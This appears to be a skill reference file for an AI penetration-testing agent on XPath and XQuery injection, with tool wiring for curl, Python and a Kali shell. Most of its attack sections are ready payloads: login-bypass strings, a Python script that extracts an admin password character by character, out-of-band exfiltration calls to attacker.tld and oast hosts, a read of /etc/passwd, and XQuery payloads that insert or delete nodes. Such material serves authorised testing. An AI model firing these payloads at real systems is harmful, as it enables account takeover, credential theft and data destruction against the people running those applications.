---
name: XPath Injection
description: Reference for XPath / XQuery injection covering authentication bypass, blind boolean / time probes, XPath 2.0+ extensions, and XML node disclosure.
---

# XPath Injection

Reference for testing XPath injection in apps that authenticate or query against XML stores (employee directories, configuration files, legacy SOA backends, XML-driven CMSes). Pull this in when input flows into an `xpath()` / `selectNodes()` / `evaluate()` call.

> Black-box scope: probes drive HTTP and observe response-body / error / timing differentials. XPath 1.0 is the lowest common denominator; XPath 2.0+ adds richer functions when the engine supports them.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| HTTP probes | `execute_curl` | Always capture status, body length, error text. |
| Programmatic boolean-blind extraction | `execute_code` | Python `requests` + a binary-search harness. |
| Local XPath testing on a sample doc | `kali_shell` | `xmllint --xpath '<expr>' /tmp/doc.xml` |

## XPath 1.0 primer

```
//user[username='alice' and password='secret']
/users/user[position()=1]
/users/user[contains(name, 'al')]
//user[role='admin']/username
```

Useful built-ins:

| Function | Purpose |
|---|---|
| `string(node)` | Stringify a node |
| `string-length(s)` | Length |
| `substring(s, start, len)` | Slice (1-indexed) |
| `concat(a, b, ...)` | Concat |
| `count(nodeset)` | Count |
| `name(node)` | Local name |
| `local-name(node)` | Same |
| `boolean()` | Coerce |
| `not()` | Negate |
| `position()`, `last()` | Index helpers |

Metacharacters: `' " ( ) [ ]` plus the path separators `/ //`.

## Reconnaissance

### Find injection points

| Surface | Likely XPath shape |
|---|---|
| Login form | `//user[username='$U' and password='$P']` |
| Settings lookup | `//config[@key='$INPUT']/value` |
| User profile | `//user[@id='$ID']` |
| Search bar | `//doc[contains(., '$Q')]` |

### Fingerprint the engine

| Probe | What it tells you |
|---|---|
| `' or '1'='1` | Classic auth bypass; works on every XPath engine |
| `'/preceding::/comment()` | Indicates XPath 2.0+ (axes more flexible) |
| `'/concat('a','b')` test | XPath 1.0 supports `concat` |
| Error message contains "saxon" | Saxon engine (XPath 2.0/3.1) |
| Error mentions "Xalan" | Xalan (XPath 1.0) |
| Error mentions "lxml" | libxml2 / Python lxml |
| Error mentions "DOMXPath" | PHP DOMXPath (XPath 1.0) |

XPath 2.0+ gives richer extraction (`doc()`, `unparsed-text()`, regex). XPath 1.0 is what most legacy apps still use.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.grep "Saxon"` (also `Xalan`, `lxml`, `DOMXPath`) reads verbatim XPath engine errors already sitting in captured response bodies, fingerprinting engine and version.
- For a GET search param, `redamon.fuzz id "q" [...]` drives the boolean-blind `substring()` binary search over one captured QUERY param, iterating the character-position payload sets.
- For login / search body params (redamon.fuzz is query-only), `redamon.replay id mutate:{param:{"username":"' or '1'='1"}}` mutates the field with quote-flip payloads.
- `redamon.diff id_legit id_injected` exposes the success-versus-failure oracle between a legitimate and an injected response.

## Attack matrix

### Authentication bypass

Same canonical payloads as SQLi adapted to XPath syntax:

| Payload | Filter reshape | Effect |
|---|---|---|
| `' or '1'='1` | `[username='' or '1'='1' and password='...']` | Bypass when `or` short-circuits |
| `' or 1=1 or '` | Same | Variant to handle parenthesis context |
| `admin' or '1'='1` | `[username='admin' or '1'='1' and password='...']` | Pin to `admin` |
| `admin' or 1=1 or 'a'='b` | Forces always-true regardless of password | Stronger variant |
| `' or count(//user)>0 or '` | Use `count()` to short-circuit | When literals are filtered |
| `' or string-length(name(/*))>0 or '` | Same idea, function-based | When operators stripped |
| `']\|//*\|[''` | Selects all nodes when `]\|` injected into `[...]` | Path injection |

For double-quote contexts:

```
" or "1"="1
" or 1=1 or "
admin" or 1=1 or "a"="b
```

### Boolean blind

When the response is binary (login success vs failure):

```
' or substring(/users/user[1]/password,1,1)='a' or '1'='1
' or substring(/users/user[1]/password,1,1)='b' or '1'='1
...
```

Programmatic extraction (binary search):

```
execute_code language: python
import requests, string
TARGET = "https://target.tld/login"
SUCCESS = "Welcome"
known = ""
charset = string.printable.strip()
for pos in range(1, 60):
    for ch in charset:
        payload = f"' or substring(/users/user[username='admin']/password, {pos}, 1)='{ch}' or '1'='1"
        r = requests.post(TARGET, data={"username": payload, "password": "x"})
        if SUCCESS in r.text:
            known += ch
            print("found", pos, ch, "=>", known)
            break
    else:
        break
```

### Node enumeration

```
' or count(//*)=COUNT or '             -> enumerate the doc node count
' or name(/*[1])='ROOT' or '           -> get root element name
' or name(/*[1]/*[1])='CHILD' or '     -> walk one level deeper
```

Build the document structure attribute by attribute. The `name()` / `local-name()` functions reveal element names even when content is gated.

### XPath 2.0+ extensions

When the engine is Saxon or any XPath 2.0+ implementation, the surface widens:

| Function | Use |
|---|---|
| `doc('http://attacker.tld/x.xml')` | OOB exfil via attacker-controlled doc fetch |
| `doc(concat('http://attacker.tld/?leak=', encode-for-uri(//user[1]/password)))` | Payload-driven exfil |
| `unparsed-text('file:///etc/passwd')` | Read local file (when permitted by sandbox config) |
| `matches(s, regex)` | Regex-based blind |
| `replace(s, regex, repl)` | Substitution oracles |

OOB exfil pattern (XPath 2.0+ only):

```
' or doc(concat('http://oast-callback.tld/?p=', encode-for-uri(//user[username='admin']/password)))=1 or '
```

The `interactsh-client` log will show the password attribute appended to the callback URL when the engine evaluates the doc fetch.

```
kali_shell: interactsh-client -v
# in another agent step, fire the payload via execute_curl
```

### XQuery (when accepting full queries)

XQuery is XPath's superset. If the endpoint accepts XQuery (e.g. RESTXQ, BaseX, eXist-db):

```
declare variable $x external;
for $u in //user where $u/username eq $x return $u
```

Probes:

```
admin' return doc('http://attacker.tld/?leak=1') (:
admin' insert node <admin>x</admin> as last into //users (:
admin' delete node //user[username='target'] (:
```

## Probe harness

Single-shot bypass test:

```
execute_curl url: "https://target.tld/login" method: "POST" data: "username=' or '1'='1&password=x"
execute_curl url: "https://target.tld/login" method: "POST" data: 'username=" or "1"="1&password=x'
execute_curl url: "https://target.tld/login" method: "POST" data: "username=admin'%20or%201=1%20or%20'a'='b&password=x"
```

OOB confirmation (XPath 2.0+):

```
kali_shell: interactsh-client -v -o /tmp/oast.log &
execute_curl url: "https://target.tld/api/lookup?q=' or doc('http://<oast-id>.oast.fun/?p=' or '1'='1"
# wait, then read /tmp/oast.log for the callback line
```

## Validation shape

A clean XPath-injection finding includes:

1. The exact request and parameter being injected.
2. The XPath shape (inferred from error / response differential).
3. The injected payload + resulting evaluated expression (when known).
4. For auth bypass: a successful login response with audit-log entry under `admin`.
5. For data extraction: at least one piece of recovered text (with bytes / characters extracted), proving the oracle works.
6. For OOB: the interactsh callback log line carrying the leaked data.

## False positives

- Engine returns generic "invalid query" 500 for every malformed payload.
- Strict allowlist on input characters; `'` and `"` rejected before XPath construction.
- Library uses parameterized queries (`xpath_query.setVariable("u", input)`).
- WAF rejecting common payloads server-side; verify by sending equivalent encoded forms.

## Hand-off

```
Auth bypass via XPath        -> built-in brute_force_credential_guess (downstream)
OOB exfil via XPath 2.0+      -> file as Information Disclosure + XPath Injection
File read via unparsed-text   -> chain to LFI / SSRF
XQuery write/delete primitive -> escalate; potential RCE on document store
```

## Pro tips

- Many XPath errors are rendered into the response body verbatim. Trigger a malformed payload first and read the error to confirm engine + version.
- XPath does NOT have comments in the same sense as SQL. Use `or '1'='1` to short-circuit; avoid `--` style.
- XPath 2.0+ vs 1.0 detection drives the entire kill chain. If `doc()` / `unparsed-text()` works, OOB exfil is one payload away.
- For double-quote-delimited contexts, the same payloads with quote-flipping work; some engines use single-quote-only.
- XPath syntax errors typically reveal the engine name: Saxon, Xalan, libxml2, DOMXPath all error differently.
